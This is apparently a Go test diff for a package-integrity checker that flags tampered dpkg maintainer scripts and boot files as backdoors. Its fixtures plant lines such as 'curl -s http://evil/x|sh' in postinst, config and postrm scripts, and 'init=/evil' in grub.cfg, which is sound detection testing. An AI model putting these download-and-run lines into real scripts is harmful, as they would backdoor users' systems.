@@ -2581,7 +2581,7 @@ func TestJudgeClockSkewIsANote(t *testing.T) {
 	res := archive()
 	res.ClockSkew = &pkgverify.ClockSkew{Clock: now.Add(8 * 24 * time.Hour), Signed: now}
 	f := must(t, run(clean(), nil, res), "pkg.clock_skew", model.SevNote)
-	if !strings.Contains(f.Title, "8 days ahead") || !strings.Contains(f.Why, "2026-11-22") || !strings.Contains(f.Why, "2026-11-30") {
+	if !strings.Contains(f.Title, "is out of date") || !strings.Contains(f.Title, "8 days ahead") || !strings.Contains(f.Why, "2026-11-22") || !strings.Contains(f.Why, "2026-11-30") {
 		t.Errorf("title %q, why %q", f.Title, f.Why)
 	}
 	res.ClockSkew = &pkgverify.ClockSkew{Clock: now.Add(-50 * time.Hour), Signed: now}
@@ -2589,4 +2589,64 @@ func TestJudgeClockSkewIsANote(t *testing.T) {
 		t.Errorf("title %q", f.Title)
 	}
 	absent(t, run(clean(), nil, archive()), "pkg.clock_skew")
+}
+
+// During an outage pkgverify marks every planned script "unreachable". A
+// script edited or planted for a package that did not change is not part of
+// any update: it stays a backdoor sign, or anyone who can cut the network
+// could append to a postinst for the price of a note.
+func TestJudgeOutageDoesNotFoldScriptsOfUnchangedPackages(t *testing.T) {
+	const reason = "could not read the official archive index: http://deb.debian.org/debian/dists/bookworm/InRelease: dial tcp: i/o timeout"
+	outage := func(p string) *pkgverify.Result {
+		return &pkgverify.Result{Mode: pkgverify.ModeArchive, Errors: []string{reason},
+			Unverifiable: []pkgverify.FileVerdict{{Path: p, Package: "openssl", Version: "3.0.14-1~deb12u2", Reason: reason, Kind: pkgverify.KindUnreachable}}}
+	}
+	old := clean()
+	old.Files = append(old.Files, file(info+"openssl.postinst", "#!/bin/sh\nexit 0\n", 0o755))
+	cur := clone(old)
+	setFile(cur, file(info+"openssl.postinst", "#!/bin/sh\ncurl -s http://evil/x|sh\nexit 0\n", 0o755))
+	r := run(cur, snapOf(old), outage(info+"openssl.postinst"))
+	must(t, r, "snap.file_modified:"+info+"openssl.postinst", model.SevBackdoor)
+	if f := find(r, "pkg.unchecked_changes"); (f != nil && hasEvidencePath(f, info+"openssl.postinst")) || r.ExitCode != 2 {
+		t.Errorf("exit %d, unchecked note %+v", r.ExitCode, f)
+	}
+
+	cur = clone(old)
+	cur.Files = append(cur.Files, file(info+"openssl.config", "#!/bin/sh\ncurl -s http://evil/x|sh\n", 0o755))
+	must(t, run(cur, snapOf(old), outage(info+"openssl.config")), "snap.file_added:"+info+"openssl.config", model.SevBackdoor)
+
+	// The postrm of a package removed in the outage: a removal changes no script.
+	cur = clone(old)
+	removePkg(cur, "openssl")
+	cur.Files = append(cur.Files, file(info+"openssl.postrm", "#!/bin/sh\ncurl x|sh\n", 0o755))
+	must(t, run(cur, snapOf(old), outage(info+"openssl.postrm")), "snap.file_added:"+info+"openssl.postrm", model.SevBackdoor)
+}
+
+// Removing a kernel deletes its initramfs; it does not rewrite one that is
+// still there. A package that dpkg's records say is gone explains no boot
+// file that is present and changed.
+func TestJudgeRemovalExplainsNoPresentBootFile(t *testing.T) {
+	old := clean()
+	old.Packages.Installed = append(old.Packages.Installed, pkg("linux-image-6.1.0-25-amd64", "6.1.106-3", "/boot/vmlinuz-6.1.0-25-amd64"))
+	old.Files = append(old.Files, file("/boot/vmlinuz-6.1.0-25-amd64", "k25", 0o644), file("/boot/initrd.img-6.1.0-25-amd64", "initrd 25", 0o644),
+		file("/boot/grub/grub.cfg", "menu", 0o444))
+	cur := clone(old)
+	removePkg(cur, "linux-image-6.1.0-25-amd64")
+	setFile(cur, file("/boot/initrd.img-6.1.0-25-amd64", "initrd 25 + backdoor", 0o644))
+	setFile(cur, file("/boot/grub/grub.cfg", "menu init=/evil", 0o444))
+	r := run(cur, snapOf(old), archive())
+	f := must(t, r, "snap.file_modified:/boot/initrd.img-6.1.0-25-amd64", model.SevBackdoor)
+	if strings.Contains(f.Why, "no trusted source confirmed") || !strings.Contains(f.Why, "removed") {
+		t.Errorf("why %q", f.Why)
+	}
+	must(t, r, "snap.file_modified:/boot/grub/grub.cfg", model.SevBackdoor)
+
+	// The real removal: the kernel's boot files are gone with it.
+	cur.Files = slices.DeleteFunc(cur.Files, func(e model.FileEntry) bool { return strings.Contains(e.Path, "6.1.0-25") })
+	setFile(cur, file("/boot/grub/grub.cfg", "menu", 0o444))
+	r = run(cur, snapOf(old), archive())
+	absent(t, r, "snap.file_removed:/boot/initrd.img-6.1.0-25-amd64")
+	if r.ExitCode == 2 {
+		t.Errorf("a real kernel removal: %v", keys(r))
+	}
 }
